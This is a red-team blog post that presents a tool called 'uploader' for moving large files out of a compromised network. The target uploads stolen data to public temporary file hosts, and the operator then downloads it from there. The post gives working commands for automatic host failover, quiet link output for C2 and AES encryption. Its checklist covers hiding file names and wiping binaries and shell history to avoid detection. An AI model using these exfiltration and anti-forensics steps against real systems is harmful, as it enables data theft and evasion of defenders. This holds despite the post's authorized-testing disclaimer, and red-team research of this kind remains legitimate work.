---
title: "When C2 Can't Pull Large Files: Cloud Relay for Post-Exploitation Exfil"
date: 2026-07-16T23:16:00+08:00
draft: false
description: "C2 is a poor pipe for large files. Split heavy traffic onto temporary cloud hosts, and use Uploader for probe, routing, packing, and encrypted upload."
categories: ["security"]
tags: ["red-team", "c2", "post-exploitation", "uploader", "file-transfer"]
featuredImage: "/images/posts/c2-large-file-exfil-via-cloud-upload/featured.jpg"
featuredImagePreview: "/images/posts/c2-large-file-exfil-via-cloud-upload/featured.jpg"
lightgallery: true
toc:
  enable: true
  auto: true
---

You are inside the network. Privileges are solid. The dumps and config backups are sitting right there — and still hard to get out. That happens a lot in authorized pentests.

<!--more-->

The bottleneck is usually the channel, not discovery: C2 (Command and Control) was never meant to move large files.

{{< admonition warning "Disclaimer" >}}
For authorized penetration testing and research only. Do not use this against systems you do not have permission to test.
{{< /admonition >}}

## 1. Why not pull big files over C2

C2 is for control, command delivery, and light interaction. Pulling tens or hundreds of MB over it is more than a wobbly session.

**The session itself.** Large transfers saturate the channel, freeze interactive work, and shake the heartbeat until the session dies mid-download. With sleep/jitter, one big file can drag on forever; many C2 downloaders have weak resume, so a break means starting over.

**The path shape.** HTTP(S) encoding and chunking can inflate traffic well beyond the original size. Each hop through pivots, SOCKS, or internal jump hosts adds latency and failure modes. On a shared Team Server, one operator's bulk download hurts everyone else's responsiveness.

**Field and engineering limits.** Some implants cap size, timeout, or concurrency. Directories get dragged file by file. Staging leaves temporary artifacts that AV and behavior monitors can see. Worst case: a long, heavy flow toward your own C2 infrastructure paints where the control plane lives. Using the control channel as a data pipe is bad OPSEC.

Typical outcome: access is fine, the session is fine, and the evidence is incomplete — or the cost of getting it out already exceeds the value.

## 2. Don't pull — make the target push

A more stable pattern moves heavy traffic off C2:

1. Stage files or directories on the target
2. Have the target upload to a reachable cloud or temporary file host
3. Download from that host on the attack machine
4. Keep C2 for a short command and the returned link

Heavy traffic goes target → public upload service; control traffic stays on C2. The session is less likely to die under load, and the C2 infra does not have to absorb the bulk transfer.

The practical ask is narrow: drop a small binary on the target (Win/Linux first; macOS builds exist), point it at files or a directory, and let it push. Few dependencies, no popups, output a script can parse; fail early on size or dead backends instead of after a half-finished upload.

## 3. From Transfer to Uploader

The idea is not new. [Mikubill/transfer](https://github.com/Mikubill/transfer) already shipped a multi-backend CLI: drop a binary, pick a host, upload, get a link.

It has been largely unmaintained (last visible activity around 2023). Dead backends, API drift, and edge bugs fail in the field; the help text often does not show which hosts exist, their size limits, or whether the current network can reach them.

I forked and reworked the approach as [simonlee-hello/uploader](https://github.com/simonlee-hello/uploader) (MIT; Go primary, mostly stdlib, ~6MB static binary; smaller experimental Rust build). UI and errors are English-only and kept short.

What it adds in practice:

- **Backend selection**: `-b` (backend) pins a host, e.g. `-b lit`. Without `-b`, auto mode filters by file size, runs `probe`, tries hosts from lowest latency, and fails over on error. With `-b` alone the host is fixed; `-b lit -auto` prefers lit but may still fail over.
- **Visibility**: `uploader backends` lists name, size limit, status, and URL; `uploader probe` checks reachability and latency on the current network. Status is `ok` / `flaky` / `down`; unstable hosts are skipped unless you pass `-force`.
- **Size preflight**: compares payload size to host limits before upload. For directories it uses the sum of file sizes as an upper bound (final zip size may differ); oversize aborts early with alternate host hints.
- **Directories**: default Deflate zip to disk, upload, then delete the temp archive. `-r` uploads each file without packing.
- **Encryption**: AES-256-CBC (`UP01` header + random IV), e.g. `-e -k 'your-key'`. Encrypted uploads disguise the name with a normal extension (like `.bin`) instead of `.encrypt`, which some hosts reject.
- **Quiet output**: `-q` prints only the download link on stdout for C2/scripts; errors stay on stderr. Avoid `-keep`, which waits for Enter and hangs headless runs.

There are 11 built-in backends (`temp`, `lit`, `gof`, `wss`, `fic`, `gg`, …). `cat` and `bash` are flaky; `nil` (0x0.st) is down. The list is informative — always trust `probe` on site.

## 4. Fitting C2 workflows

{{< image src="/images/posts/c2-large-file-exfil-via-cloud-upload/uploader-demo.gif" caption="Uploader demo: backends / probe / upload / quiet mode / encrypt" >}}

Most common command:

```bash
uploader -q ./evidence
```

Without `-b` (no pinned backend): size filter → probe → latency order → failover. Directories are packed first. On success, stdout is usually a single link. Exit codes: `0` success, `1` upload/config error, `2` bad flags.

Pin a backend, or prefer one but still allow failover:

```bash
uploader -q -b lit ./dump.zip
uploader -q -b lit -auto ./dump.zip
uploader -q -r ./dir
uploader -q -e -k 'your-key' ./secret.bin
```

Probe only:

```bash
uploader backends
uploader probe
uploader probe temp lit gof -timeout 20
```

Hosts also differ in capacity and TTL (litterbox is about 72 hours). Pull the link from your own environment promptly.

## 5. Field checklist

1. Confirm egress: internet, proxy, allowlists, TLS inspection
2. Validate with a small file, then move the real package
3. Encrypt sensitive payloads with `-e -k`; keep filenames non-descriptive
4. Clean temp zips, the binary, and shell history; download cloud links before they expire

C2 for control, uploader for bulk exfil — do not make one channel do both heavy jobs.

## 6. Wrap-up

Post-exploitation often stalls not on privilege, but on moving large files without killing the session. Wrong channel choice means you can get in and still cannot get the data out.

Having the target push to a cloud host, then pulling from that host, keeps bulk load off the control plane.

- Project: [simonlee-hello/uploader](https://github.com/simonlee-hello/uploader)
- Inspired by: [Mikubill/transfer](https://github.com/Mikubill/transfer)
